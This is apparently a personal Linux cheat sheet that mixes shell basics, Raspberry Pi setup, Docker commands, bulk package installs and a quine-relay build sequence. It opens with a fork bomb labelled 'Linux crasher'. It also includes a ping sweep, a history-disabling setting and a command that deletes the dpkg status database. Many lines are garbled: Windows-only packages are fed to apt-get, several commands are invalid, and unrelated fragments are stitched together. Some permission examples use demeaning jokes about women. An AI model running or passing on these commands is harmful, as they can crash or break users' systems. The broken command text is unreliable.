#--------------------------------------------------------------------------------------------------------------------------------
# Linux crasher
:(){:|:&};:

# Pathname expansion
.   # Current directory
..  # Parent directory
~   # Home directory
-   # Previous directory

# Match list
[0123456789]

# Match range
[0-9]
[a-z]
[A-Z]

# Not match list
[!0123456789]

# Not match range
[!0-9]
[!a-z]
[!A-Z]

# Character classes
[[:digit:]]
[[:upper:]]
[[:lower:]]
[[:alpha:]]
[[:alnum:]]
[[:space:]]
[[:graph:]]
[[:print:]]
[[:punct:]]
[[:cntrl:]]
[[:xdigit:]]

{}


# Shell command history
history
!!			# Previous command
!n			# Particular command
!-n			# Nth previous command
!c			# Last command starting with c
c !*		# Use parameters from last command
sudo !!		# When forgetting sudo
Ctrl - r	# reverse i search, Ctrl - r

# Exclude commands preceeded by space from history .bash_profile
export HISTCONTROL=ignorespace
export HISTCONTROL=ignoredups
export HISTCONTROL=erasedups
export HISTCONTROL="ignorespace:ignoredups:erasedups"
export HISTIGNORE="history*"
export HISTIGNORE="history*:ls*"
export HISTTIMEFORMAT="%Y %h %d %H:%M:%S >>> "
export HISTSIZE=0
export HISTSIZE=-1



# manual for commands
man command

# clear the screen
clear

# Change directory to previous location
cd -

# Change directory to home location
cd ~

# output file contents
# -n number the lines
cat -n ./file.ext

# output file contents in reverse line order
# -n number the lines
tac -n ./file.ext

# output file contents in reverse
# -n number the lines
rev -n ./file.ext

# output the first n lines of file
# -n specify number of lines
head -n 20 ./file.ext

# output the last n lines of file
# -n specify number of lines
tail -n 20 ./file.ext

# not less than more
less ./file.ext

# not more than less
more ./file.ext

# search and filters based on patterns
# -n number the lines
# -i case insenitive search
# -v exclude search term
# -E extended regular expression
grep -in "find" ./file.ext
grep -vin "ignore" ./file.ext
grep 'deb http' /etc/apt/sources.list

# can extract data from columns or arrange rows into fields to extract needed data
# return the thrid, first and second columns from a file
# '{print $3 "\t" $1 "\t" $2}'
# -F delimiter character
awk '{print $3 "\t" $1 "\t" $2}' ./file.ext
# return the number of times each entry was encountered from the first field in a file
awk '{print $1}' ./filename.log | sort | uniq -c | sort -n
awk '{print $6}' ./filename.log | sort | uniq -c | sort -n
awk '{print $9}' ./filename.log | sort | uniq -c | sort -n
# count number of invalid login attempts from unique users 
cat auth.log | grep -in "input_userauth_request" | awk '{print $9}' | sort | uniq -c | sort -n

# stream editor performs find and replace
sed s/Find this/Replace that/ ./file.ext

# arranges order of output 
# -r reverse
# -n numeric
# -k key to sort by
# -u remove duplicates showing only unique
sort -rnk2 ./file.ext

# duplicate handling functions
# -c return the count of each unique entry
uniq -c

# word count
# word count lines in file
wc -l ./some.file

# translate input from pipe
| tr [:lower:] [:upper:] 

# redirection
# >1 standard output
# >2 standard error
# >>1 append standard output
# >>2 append standard error

# tape archive
# -c create
# -v verbose
# -f file
# -a compress acording to extension
# -x extract
# -C change to folder and extract
tar -cvf archive.tar ./Files\ or\ Folder/
tar -cavf archive.tar.gz ./Files\ or\ Folder/
tar -cavf archive.tar.bz2 ./Files\ or\ Folder/
tar -xavf archive.tar.gz -C ./folder

# remove criteria from file
cut 

# determine filetype
file 

# return the full path of an object in the path
which which

# update the filename access attributes of a file
touch young.sexy.virgin
ren young.sexy.virgin young.sexy.woman

# change owner
chown alpha-male young.sexy.woman

# change permission mode
chmod 700 young.sexy.woman

# create group
groupadd beta-males

# add user to group
usermod -aG group username

# change group
chgrp beta-males used.sexy.woman
ren young.sexy.woman used.sexy.woman
chmod 570 used.sexy.woman

ren used.sexy.woman crazy.cat.lady
chmod 457 crazy.cat.lady

pingsweep.sh
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done


# find the disk usage of file from the current folder recursively and sort by file size
# -h human readable
# -d depth level
sudo du / -hd1
sudo tree

# free disk space
# -h human readable
df -h

watch df -h

# run previous command as sudo
sudo !!

# show partioning
fdisk -l

# free memory
# -h human readable
free -h
free | head -n 2 | awk '{print $3}'
free -h | head -n 3 | awk '{print $1, $4}'

watch free -h

# list distribution details
lsb_release -idrc
cat /etc/*{release,version}

# list hardware devices
sudo apt install lshw
lshw

# list and modify PCI devices
lspci
setpci

# list USB devices
lsusb

# list block devices
lsbk
blkid

# list cpu details
lscpu
cat /proc/cpuinfo

# list devices
sudo apt install procinfo
lsdev

# get and set storage device setting
hdparm

# push/pull bytes to address
outb
inb

# current shell process ID
echo $$
ls -lah /proc/$$
ls -lah /proc/$$/exe
ls -lah /proc/$$/cwd

# Kernel version
# -a all system information
uname -a

# locate command
which 

# find ethernet controller
lspci | grep -i ethernet

# list system control settings
sysctl

# exit from vim
:q!

# Encrypt file
aescrypt -e -p password plain.txt

# Decrypt file
aescrypt -d -p password cipher.text.aes

# Repeat a command until successful
while true
do
ping -c 1 www.google.co.uk > /dev/null 2>&1 && break
done;

# Display Output as a Table
mount | column –t

cat /etc/passwd | column -t -s:

# Sort Processes by Memory Usage
ps aux | sort -rnk 4

# Sort Processes by CPU Usage
ps aux | sort -nk 3

# Watch multiple logs
apt-get install multitail

# Create zero file of set size
dd if=/dev/zero of=out.txt bs=1M count=10

# Run last command as root
sudo !!

# Replace Spaces With Tabs
cat whitespaces.txt | tr ':[space]:' '\t' > blacktabs.txt
cat lowers.txt | tr a-z A-Z > UPPERS.txt

# Compress image files
find -name *.png -type f -print | xargs tar -cvzf images.tar.gz

# Download URL's
cat urls.txt | xargs wget
wget -i  urls.txt

# copy files to destination
ls /etc/*.conf | xargs -i cp {} /home/profile/Desktop/out

# Managing background tasks
operation1 &
Ctrl - Z
fg %1
Ctrl - Z
bg %1
operation2 &
Ctrl - Z
bg %2
jobs -l
operation3 &
Ctrl - Z
bg %3
jobs -l
kill -STOP %2
jobs -l
kill -CONT %2
jobs -l
disown %1
jobs -l
ps
kill %2 %3

# Environment variables
printenv
printenv SHELL
echo $SHELL

# Shell variables
set
set -o posix
set | less
set +o posix
unset

export shell2environment

#--------------------------------------------------------------------------------------------------------------------------------
# Shell scripting

nano script.sh
#--------------------------------------------------------------------------------------------------------------------------------
#!/bin/bash

# comment

echo "Shout!"

variable="Value"



func() {
       echo "$1 and $2 passed to function"
}

func "string"
func "string" 101
func $variable



control () {

	if [[ $1 = "value" ]]; then
		echo "variable has low $1"
	elif [[ $1 = "VALUE" ]]; then
		echo "variable has high $1"
	else
		read -p "Risk: " risk
		echo "variable has $risk of no value"
	fi
}

control $variable

#--------------------------------------------------------------------------------------------------------------------------------

chmod +x script.sh

./script.sh

#--------------------------------------------------------------------------------------------------------------------------------
# Cron jobs

crontab -l

crontab -e
*/minute 0-59 */hour 0-23 */day 1-31 */month 1-12 */week 0-7 Sunday to Sunday
*/1 * * * * every minute
15 * * * * 
0,30,45 * * * * every 15 minutes
0 0 * * 1-5 every week day

@hourly
@daily
@midnight
@reboot
@weekly
@annually@
@yearly

*/1 * * * * ./root/script.sh


#--------------------------------------------------------------------------------------------------------------------------------
#Raspberry Pi specifics
#https://www.raspberrypi.org/forums/viewtopic.php?f=66&t=133691

sudo date -s "MMM dd YYYY HH:mm"

#Set the timezone
sudo dpkg-reconfigure tzdata

#Boot from SD card or USB devicce
vcgencmd otp_dump | grep 17
#1020000a
cat program_usb_boot_mode=1 >> /boot/config.txt
sudo restart
#3020000a

#Register raspberrypi.local
sudo insserv avahi-daemon
sudo /etc/init.d/avahi-daemon restart

#Force NTP time update
sudo /etc/init.d/ntp stop
sudo ntpd -q -g
sudo /etc/init.d/ntp start

#Add additional DNS servers
sudo nano /etc/resolv.conf
 Generated by resolvconf
nameserver 127.0.0.1
nameserver 129.12.4.247
nameserver 129.250.35.250
nameserver 195.12.4.247
nameserver 158.43.240.3
nameserver 208.67.220.220
nameserver 195.74.128.6
nameserver 194.168.8.100
nameserver 62.8.96.38
nameserver 8.8.8.8
nameserver 4.2.2.6

# Raspbian server
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep x11 | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep python | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep sound | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gnome | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep lxde | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gtk | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep desktop | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gstreamer | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep avahi | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep dbus | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep freetype | sed s/install//`
sudo apt-get -y autoremove
sudo apt-get clean

#Mount BerryBoot partition
sudo mkdir /berry
sudo mount /dev/mmcblk0p1 /berry

#Check internet connectivity
curl ipecho.net/plain ; echo

#Update to latest versions of installed software using apt-get
sudo rm /var/lib/apt/lists/* -vf
sudo rm /var/lib/dpkg/status
sudo touch /var/lib/dpkg/status
sudo apt-get install apt-transport-https
sudo apt-get autoremove -y && sudo apt-get clean
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y
sudo raspi-config

sudo apt install openssh-server

sudo ufw allow ssh 

sudo systemctl status ssh

https://www.techreally.com/enable-ssh-on-ubuntu/
sudo apt install flatpak gnome-software-plugin-flatpak gnome-software

flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo

flatpak refresh
flatpak update

sudo apt-get install afnix algol68g aplus-fsf aspectj asymptote \
  ats2-lang bash bc bf bsdgames bsh clisp clojure cmake coffeescript \
  dafny dc dhall elixir emacs-nox erlang f2c fish flex fp-compiler \
  fsharp g++ gambas3-gb-pcre gambas3-scripter gap gawk gcc gdb gdc \
  generator-scripting-language genius gforth gfortran ghc ghostscript \
  gnat gnu-smalltalk gnucobol4 gnuplot gobjc golang gpt groovy guile-3.0 \
  gzip haxe icont iconx intercal iverilog jasmin-sable jq ksh \
  libpolyml-dev lisaac livescript llvm lua5.3 m4 make maxima minizinc \
  mono-devel mono-mcs mono-vbnc nasm neko nickle node-typescript nodejs \
  ocaml octave openjdk-11-jdk pari-gp parser3-cgi perl php-cli polyml \
  python3 r-base rakudo ratfor rc regina-rexx ruby ruby-mustache rustc \
  scala scilab-cli sed slsh spin squirrel3 surgescript swi-prolog tcl \
  tcsh valac vim wabt xsltproc yabasic yorick zoem zsh # kotlin

sudo apt-get install cmake libpng-dev libgd-dev groff bison curl
make -C vendor

$ ulimit -s unlimited
$ ruby QR.rb > QR.rs
$ rustc QR.rs && ./QR > QR.scala
$ scalac QR.scala && scala QR > QR.scm
$ guile QR.scm > QR.sci
$ scilab-cli -nb -f QR.sci > QR.sed
$ sed -E -f QR.sed QR.sed > QR.spl
$ ./vendor/local/bin/spl2c < QR.spl > QR.spl.c && gcc -z muldefs -o QR -I ./vendor/local/include -L ./vendor/local/lib QR.spl.c -lspl -lm &&
  ./QR > QR.sl
$ slsh QR.sl > QR.st
$ gst QR.st > QR.nut
$ squirrel QR.nut > QR.sml
$ polyc -o QR QR.sml && ./QR > QR.sq
$ ruby vendor/subleq.rb QR.sq > QR.ss
$ surgescript QR.ss > QR.tcl
$ tclsh QR.tcl > QR.tcsh
$ tcsh QR.tcsh > QR.t
$ ruby vendor/thue.rb QR.t > QR.ts
$ tsc --outFile QR.ts.js QR.ts && nodejs QR.ts.js > QR.unl
$ ruby vendor/unlambda.rb QR.unl > QR.vala
$ valac QR.vala && ./QR > QR.mid
$ mono vendor/local/bin/Vlt.exe /s QR.mid && mono QR.exe > QR.v
$ iverilog -o QR QR.v && ./QR -vcd-none > QR.vim
$ vim -EsS QR.vim > QR.vb
$ vbnc QR.vb && mono ./QR.exe > QR.wasm
$ $(WASI_RUNTIME) QR.wasm > QR.wat
$ wat2wasm QR.wat -o QR.wat.wasm && $(WASI_RUNTIME) QR.wat.wasm > QR.ws
$ ruby vendor/whitespace.rb QR.ws > QR.xslt
$ xsltproc QR.xslt > QR.yab
$ yabasic QR.yab > QR.yorick
$ yorick -batch QR.yorick > QR.azm
$ zoem -i QR.azm > QR.zsh
$ zsh QR.zsh > QR.+
$ a+ QR.+ > qr.adb
$ gnatmake qr.adb && ./qr > QR.als
$ LANG=C LD_LIBRARY_PATH=/usr/lib/afnix axi QR.als > QR.aheui
$ ruby vendor/aheui.rb QR.aheui > QR.a68
$ a68g QR.a68 > QR.ante
$ ruby vendor/ante.rb QR.ante > QR.aj
$ ajc QR.aj && java QR > QR.asy
$ asy QR.asy > QR.dats
$ patscc -o QR QR.dats && ./QR > QR.awk
$ awk -f QR.awk > QR.bash
$ bash QR.bash > QR.bc
$ BC_LINE_LENGTH=4000000 bc -q QR.bc > QR.bsh
$ bsh QR.bsh > QR.bef
$ cfunge QR.bef > QR.Blc
$ ruby vendor/blc.rb < QR.Blc > QR.bf
$ bf -c500000 QR.bf > QR.c
$ gcc -o QR QR.c && ./QR > QR.cpp
$ g++ -o QR QR.cpp && ./QR > QR.cs
$ mcs QR.cs && mono QR.exe > QR.chef
$ PERL5LIB=vendor/local/lib/perl5 compilechef QR.chef QR.chef.pl &&
  perl QR.chef.pl > QR.clj
$ clojure QR.clj > QR.cmake
$ cmake -P QR.cmake > QR.cob
$ cobc -O2 -x QR.cob && ./QR > QR.coffee
$ coffee --nodejs --stack_size=100000 QR.coffee > QR.lisp
$ clisp QR.lisp > QR.d
$ gdc -o QR QR.d && ./QR > QR.dfy
$ dafny QR.dfy && mono QR.exe > QR.dc
$ dc QR.dc > QR.dhall || true
$ dhall text --file QR.dhall > QR.exs
$ elixir QR.exs > QR.el
$ emacs -Q --script QR.el > QR.erl
$ escript QR.erl > QR.fsx
$ fsharpc QR.fsx -o QR.exe && mono QR.exe > QR.false
$ ruby vendor/false.rb QR.false > QR.fl
$ flex -o QR.fl.c QR.fl && gcc -o QR QR.fl.c && ./QR > QR.fish
$ fish QR.fish > QR.fs
$ gforth QR.fs > QR.f
$ gfortran -o QR QR.f && ./QR > QR.f90
$ gfortran -o QR QR.f90 && ./QR > QR.gbs
$ gbs3 QR.gbs > QR.g
$ gap -q QR.g > QR.gdb
$ gdb -q -x QR.gdb > QR.gel
$ genius QR.gel > QR.gsl
$ gsl -q QR.gsl > QR.plt
$ gnuplot QR.plt > QR.go
$ go run QR.go > QR.gs
$ ruby vendor/golfscript.rb QR.gs > QR.gpt
$ mv QR.c QR.c.bak && gpt -t QR.c QR.gpt && gcc -o QR QR.c && ./QR > QR.grass &&
  mv QR.c.bak QR.c
$ ruby vendor/grass.rb QR.grass > QR.groovy
$ groovy QR.groovy > QR.gz
$ gzip -cd QR.gz > QR.hs
$ ghc QR.hs && ./QR > QR.hx
$ haxe -main QR -neko QR.n && neko QR.n > QR.icn
$ icont -s QR.icn && ./QR > QR.i
$ ick -bfOc QR.i && gcc -static QR.c -I /usr/include/ick-* -o QR -lick &&
  ./QR > QR.j
$ jasmin QR.j && java QR > QR.java
$ javac QR.java && java QR > QR.js
$ nodejs QR.js > QR.jq
$ jq -r -n -f QR.jq > QR.jsfuck
$ nodejs --stack_size=100000 QR.jsfuck > QR.kt
$ kotlinc QR.kt -include-runtime -d QR.jar && kotlin QR.jar > QR.ksh
$ ksh QR.ksh > QR.lazy
$ lazyk QR.lazy > qr.li
$ lisaac qr.li && ./qr > QR.ls
$ lsc QR.ls > QR.ll
$ llvm-as QR.ll && lli QR.bc > QR.lol
$ lci QR.lol > QR.lua
$ lua5.3 QR.lua > QR.m4
$ m4 QR.m4 > QR.mk
$ make -f QR.mk > QR.mac
$ maxima -q --init-mac=QR.mac > QR.mzn
$ minizinc --solver Gecode --soln-sep '' QR.mzn > QR.il
$ ilasm QR.il && mono QR.exe > QR.mustache
$ mustache QR.mustache QR.mustache > QR.asm
$ nasm -felf QR.asm && ld -m elf_i386 -o QR QR.o && ./QR > QR.neko
$ nekoc QR.neko && neko QR.n > QR.5c
$ nickle QR.5c > QR.m
$ gcc -o QR QR.m && ./QR > QR.ml
$ ocaml QR.ml > QR.octave
$ mv QR.m QR.m.bak && octave -qf QR.octave > QR.ook && mv QR.m.bak QR.m
$ ruby vendor/ook-to-bf.rb QR.ook QR.ook.bf && bf -c500000 QR.ook.bf > QR.gp
$ gp -f -q QR.gp > QR.p
$ parser3 QR.p > QR.pas
$ fpc QR.pas && ./QR > QR.pl
$ perl QR.pl > QR.pl6
$ perl6 QR.pl6 > QR.php
$ php QR.php > QR.png
$ npiet QR.png > QR.ps
$ gs -dNODISPLAY -q QR.ps > QR.ppt
$ ppt -d < QR.ppt > QR.prolog
$ swipl -q -t qr -f QR.prolog > QR.pr
$ spin -T QR.pr > QR.py
$ python3 QR.py > QR.R
$ R --slave -f QR.R > QR.ratfor
$ ratfor -o QR.ratfor.f QR.ratfor && gfortran -o QR QR.ratfor.f &&
  ./QR > QR.rc
$ rc QR.rc > QR.rexx
$ rexx ./QR.rexx > QR2.rb



sudo docker build -t qr .
sudo docker run --privileged --rm -e CI=true qr

sudo apt-get upgrade peazip -y
ip a show
sudo apt-get upgrade netdiscover -y
sudo netdiscover -i wlp3s0 -P -r 192.168.1.0/24


sudo apt-get upgrade curl -y
sudo apt-get upgrade wget -y
sudo apt-get upgrade timeit -y
sudo apt-get upgrade bginfo -y
sudo apt-get upgrade boxstarter -y

sudo apt-get upgrade glasswire -y --ignore-checksum
sudo apt-get upgrade cpz-z.install -y
sudo apt-get upgrade cpz-z -y
sudo apt-get upgrade gpu-z -y
sudo apt-get upgrade hwinfo.install -y
sudo apt-get upgrade hwinfo -y
sudo apt-get upgrade vcredist140 -y
sudo apt-get upgrade samsung-magician -y
sudo apt-get upgrade data-lifeguard-diagnostic -y
sudo apt-get upgrade crystaldiskinfo.install -y
sudo apt-get upgrade crystaldiskinfo -y

sudo apt-get upgrade amd-ryzen-chipset -y

sudo apt-get upgrade intel-chipset-device-software -y
sudo apt-get upgrade intel-graphics-driver -y
sudo apt-get upgrade intel-me-drivers -y
sudo apt-get upgrade intel-proset-drivers -y
sudo apt-get upgrade intel-rst-driver -y
sudo apt-get upgrade intel-xtu -y
sudo apt-get upgrade intel-mas -y

sudo apt-get upgrade nvidia-display-driver -y
sudo apt-get upgrade geforce-game-ready-driver -y
sudo apt-get upgrade geforce-experience -y
sudo apt-get upgrade nvidia-geforce-now -y
sudo apt-get upgrade cuda -y
sudo apt-get upgrade vulkan-sdk -y
sudo apt-get upgrade disable-nvidia-telemetry -y

sudo apt-get upgrade sysinternals --params "/installdir:c:\sysinternalssuite" -y
sudo apt-get upgrade busybox -y
sudo apt-get upgrade nirlauncher /sysinternals -y
sudo apt-get upgrade wiztree -y
sudo apt-get upgrade veracrypt -y
sudo apt-get upgrade keepass.install -y
sudo apt-get upgrade keepass -y
sudo apt-get upgrade testdisk-photorec -y

sudo apt-get upgrade everything -y
sudo apt-get upgrade launchy -y
sudo apt-get upgrade revo-uninstaller -y

sudo apt-get upgrade prey -y
sudo apt-get upgrade privoxy -y
sudo apt-get upgrade shutup10 -y
    . oosu10.exe "$formscriptlocation\ooshutup10.cfg" /quiet
sudo apt-get upgrade openssh -y
sudo apt-get upgrade openssl -y
sudo apt-get upgrade gnupg -y
sudo apt-get upgrade gpg4win -y
sudo apt-get upgrade openvpn -y

sudo apt-get upgrade microsoft-teams.install -y
sudo apt-get upgrade microsoft-teams -y
sudo apt-get upgrade office365proplus -y
sudo apt-get upgrade skyprforbusiness -y
sudo apt-get upgrade onedrive -y

sudo apt-get upgrade googlechrome -y
sudo apt-get upgrade adblockpluschrome -y
sudo apt-get upgrade ublockorigin-chrome -y
sudo apt-get upgrade https-everywhere-chrome -y
sudo apt-get upgrade firefox -y
sudo apt-get upgrade adblockplus-firefox -y
sudo apt-get upgrade opera -y
sudo apt-get upgrade adblockplus-opera -y
sudo apt-get upgrade microsoft-edge -y
sudo apt-get upgrade chromium -y
sudo apt-get upgrade vivaldi -y
sudo apt-get upgrade brave -y

sudo apt-get upgrade claws-mail -y
sudo apt-get upgrade thunderbird -y
sudo apt-get upgrade signal -y
sudo apt-get upgrade wire -y
sudo apt-get upgrade telegram -y
sudo apt-get upgrade hexchat -y
sudo apt-get upgrade pidgin -y
sudo apt-get upgrade gajim -y

sudo apt-get upgrade rapidee -y
sudo apt-get upgrade mremoteng -y
    
sudo apt-get upgrade scrcpy -y
sudo apt-get upgrade nomachine -y
sudo apt-get upgrade teamviewer -y
sudo apt-get upgrade anydesk -y
sudo apt-get upgrade mousewithoutborders -y
sudo apt-get upgrade putty.install -y
sudo apt-get upgrade putty -y
sudo apt-get upgrade winscp.install -y
sudo apt-get upgrade winscp -y
sudo apt-get upgrade filezilla -y
sudo apt-get upgrade muon -y
sudo apt-get upgrade nextcloud-client -y
sudo apt-get upgrade dropbox -y
sudo apt-get upgrade qbittorrent -y

sudo apt-get upgrade win32diskimager.install -y
sudo apt-get upgrade unetbootin -y
sudo apt-get upgrade rpi-imager -y
sudo apt-get upgrade etcher -y
sudo apt-get upgrade rufus -y
sudo apt-get upgrade rufus.install -y
sudo apt-get upgrade yumi -y
sudo apt-get upgrade ventoy -y
sudo apt-get upgrade backupper-standard -y
sudo apt-get upgrade yumi-uefi -y

sudo apt-get upgrade git.install -y
sudo apt-get upgrade git -y
sudo apt-get upgrade git-credential-manager-for-windows -y
sudo apt-get upgrade github-desktop -y
git clone https://github.com/home-assistant/core.git
git clone https://github.com/Ylianst/MeshCentral.git
git clone https://github.com/pritunl/pritunl.git
git clone https://github.com/Botspot/pi-apps.git
git clone https://github.com/cisagov/Sparrow.git
git clone https://github.com/countercept/chainsaw.git
git clone https://github.com/CrowdStrike/CRT.git
git clone https://github.com/jivoi/awesome-osint.git
git clone https://github.com/jmcerrejon/PiKISS.git
git clone https://github.com/pi-hole/docker-pi-hole.git
git clone https://github.com/PlummersSoftwareLLC/Primes.git
git clone https://github.com/proviq/AccountManagement.git
git clone https://github.com/richardg867/WaybackProxy.git
git clone https://github.com/SelfhostedPro/Yacht.git
git clone https://github.com/ukncsc/lme.git
git clone https://github.com/mandiant/Mandiant-Azure-AD-Investigator.git
sudo apt-get upgrade gh -y
sudo apt-get upgrade lfs.install -y
sudo apt-get upgrade git-lfs -y

sudo apt-get upgrade terraform -y
sudo apt-get upgrade vagrant -y
sudo apt-get upgrade packer -y
sudo apt-get upgrade vault -y

sudo apt-get upgrade virtualbox -y
sudo apt-get upgrade qemu -y
sudo apt-get upgrade docker -y
sudo apt-get upgrade docker-compose -y
sudo apt-get upgrade docker-toolbox -y
sudo docker volume create portainer_data
sudo docker run -d -p 8000:8000 -p 9443:9443 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:2.9.3
https://localhost:9443
sudo docker container run -t --name hello-world hello-world:latest
sudo docker image pull busybox:latest
sudo docker container run -ti busybox:latest echo "busybox image installed"
sudo docker container run -ti --name swarm swarm:latest
sudo docker container run --name registry registry:latest
sudo docker container run -ti --name alpine alpine:latest echo "alpine image installed"
sudo docker container run -ti -v /var/run/docker.sock:/var/run/docker.sock --name docker docker:latest echo "docker image installed"

sudo docker image pull pihole/pihole:latest

sudo docker container run -ti --name debian debian:latest echo "debian image installed"
sudo docker container run -ti --name ubuntu ubuntu:latest echo "ubuntu image installed"
sudo docker container run -ti --name fedora fedora:latest echo "fedora image installed"
sudo docker container run -ti --name centos centos:latest echo "centos image installed"
sudo docker container run -ti --name mageia mageia:latest echo "mageia image installed"
sudo docker container run -ti --name amazon amazonlinux:latest echo "amazon linux image installed"

sudo docker container run -ti --name gcc gcc:latest echo "gcc image installed"
sudo docker container run -ti --name golang golang:latest echo "go language image installed"
sudo docker container run -ti --name python3 python:latest echo "python 3 image installed"

sudo docker container run -ti --name r-base r-base:latest echo "go language image installed"
sudo docker container run -ti --name haskell haskell:latest echo "go language image installed"
sudo docker container run -ti --name julia julia:latest echo "go language image installed";&& echo "exit() to quit"

sudo docker container run -ti --name postgres postgres:latest echo "exit() to quit"
sudo docker container run -ti --name mongo mongo:latest echo "exit() to quit"
sudo docker container run -ti --name mysql mysql:latest echo "exit() to quit"
sudo docker container run -ti --name mariadb mariadb:latest echo "exit() to quit"

sudo docker container run -ti --name nginx nginx:latest echo "exit() to quit"
sudo docker container run -ti --name haproxy haproxy:latest echo "exit() to quit"
    
sudo docker container run -ti --name httpd httpd:latest echo "exit() to quit"
sudo docker container run -ti --name tomcat tomcat:latest echo "exit() to quit"
sudo docker container run -ti --name maven maven:latest echo "exit() to quit"

sudo docker container run -ti --name openjdk openjdk:latest echo "exit() to quit"
sudo docker container run -ti --name memcached memcached:latest echo "exit() to quit"
sudo docker container run -ti --name redis redis:latest echo "exit() to quit"
sudo docker container run -ti --name node node:latest echo "exit() to quit"

sudo docker container run -ti --name rabbitmq rabbitmq:latest echo "exit() to quit"
sudo docker container run -ti --name php php:latest echo "exit() to quit"
sudo docker container run -ti --name perl perl:latest echo "exit() to quit"
sudo docker container run -ti --name ruby ruby:latest echo "exit() to quit"

sudo docker container run -ti --name nextcloud nextcloud:latest echo "exit() to quit"
sudo docker container run -ti --name logstash logstash:latest echo "exit() to quit"
sudo docker container run -ti --name elasticsearch elasticsearch:latest echo "exit() to quit"
sudo docker container run -ti --name jenkins jenkins:latest echo "exit() to quit"

sudo docker image pull tensorflow/tensorflow                  # download latest image
    [string]$dockercontainer = (. docker container create -it -p 8888:8888 tensorflow/tensorflow)  # start a jupyter notebook server 
sudo docker container start $dockercontainer

sudo docker container run -ti --name gcloudsdk google/cloud-sdk:latest echo "google cloud sdk image installed"
sudo docker container run -ti google/cloud-sdk gcloud init --skip-diagnostics
sudo docker container run --rm -ti google/cloud-sdk gcloud info
sudo docker container run --rm -ti google/cloud-sdk gcloud components list
sudo docker container run --rm -ti google/cloud-sdk gcutil listinstances
sudo docker container run --rm -ti google/cloud-sdk gsutil ls

docker image pull hashicorp/waypoint:latest
docker container run -ti hashicorp/waypoint:latest --version

sudo docker container ls -a

sudo docker container logs $dockercontainer
sudo docker container inspect $dockercontainer
sudo docker container stop $dockercontainer
sudo docker container kill $dockercontainer
sudo docker container rm -f $dockercontainer

sudo docker system prune --all

sudo docker container run -ti --name nanoserver microsoft/nanoserver:latest
sudo docker container run -ti --name coreserver microsoft/windowsservercore:latest
sudo docker container run -ti --name powershell microsoft/powershell:latest
sudo docker container run -d --name nanoiis -d -it -p 80:80 nanoserver/iis

sudo docker container run -ti --name azuresdk azuresdk/azure-cli-python:latest

sudo docker container run -d --name redis -p 127.0.0.1:6379:6379 -v "$pwd/data":/data redis:latest
sudo docker container run -d --name mysql mysql:latest
sudo docker container run -d -p 80:80 --name nginx nginx:latest; curl localhost:80
sudo docker container run -d -p 8080:8080 --name webgoat webgoat/webgoat-7.1:latest; curl localhost:8080; lynx http://192.168.99.100:8080/webgoat/
sudo docker container run -d -p 1880:1880 --name nodered nodered/node-red-docker

sudo docker container run -ti --name opensuse opensuse:latest echo "opensuse image installed"
sudo docker container run -ti --name oracle oraclelinux:latest echo "oracle linux image installed"
sudo docker container run -ti --name 

sudo apt-get upgrade awscli -y
sudo apt-get upgrade heroku-cli -y
sudo apt-get upgrade azure-cli -y
sudo apt-get upgrade octopustools -y
sudo apt-get upgrade azcopy -y
sudo apt-get upgrade azcopy10 -y
sudo apt-get upgrade microsoftazurestorageexplorer -y

sudo apt-get upgrade kubernetes-cli -y
sudo apt-get upgrade minikube -y
sudo apt-get upgrade kubernetes-helm -y
sudo apt-get upgrade kubernetes-helmfile -y

sudo apt-get upgrade nasm -y
sudo apt-get upgrade llvm -y
sudo apt-get upgrade vcbuildtools -y
sudo apt-get upgrade mingw -y
sudo apt-get upgrade clang -y
sudo apt-get upgrade cmake.install -y
sudo apt-get upgrade cmake -y
sudo apt-get upgrade winlibs -y
sudo apt-get upgrade ldc -y
sudo apt-get upgrade ghc -y
sudo apt-get upgrade x64dbg.portable -y
sudo apt-get upgrade debugview -y    
sudo apt-get upgrade ida-free -y

sudo apt-get upgrade dotnetcore -y
sudo apt-get upgrade dotnetcore-windowshosting -y
sudo apt-get upgrade dotnetfx -y
sudo apt-get upgrade ilspy -y
sudo apt-get upgrade dnspyex -y
sudo apt-get upgrade nuget.commandline -y
sudo apt-get upgrade pwsh -y

sudo apt-get upgrade arduino -y
sudo apt-get upgrade thonny -y
sudo apt-get upgrade freepascal -y
sudo apt-get upgrade lazarus -y
sudo apt-get upgrade python3 -y

pip install --upgrade wheel pip setuptools packaging urllib3 requests oauthlib requests-oauthlib google-auth google-auth-oauthlib webencodings pyyaml confuse soupsieve beautifulsoup4 htmlmin markdown markupsafe jinja2 jsonschema tornado parso jedi pygments mistune pyparsing bleach pandocfilters defusedxml et-xmlfile werkzeug windows-ncurses pywin32 pywinpty pygame freegames scapy mutagen rsa bcrypt imagehash gtts-token gtts pyttsx pyqt5 pytz python-dateutil jdcal six mongoengine pymongo psycopg2 pickleshare cycler matplotlib matplotlib-venn pillow cairosvg seaborn missingno confuse backcall pandocfilters tqdm colorama click termcolor tangled-up-in-unicode wcwidth prompt-toolkit chardet idna notebook ipykernel ipython-genutils ipython jupyter-core jupyter-client nbformat nbconvert terminado ipywidgets widgetsnbextension pivottablejs certifi cachetools decorator traitlets attrs joblib entrypoints testpath send2trash kiwisolver wrapt pyzmq protobuf pyasn1         pyasn1-modules grpcio numpy scipy mpmath sympy astropy astunparse pandas llvmlite numba gast prometheus-client pyrsistent pywavelets openpyxl xlsxwriter h5py networkx visions phik scikit-learn 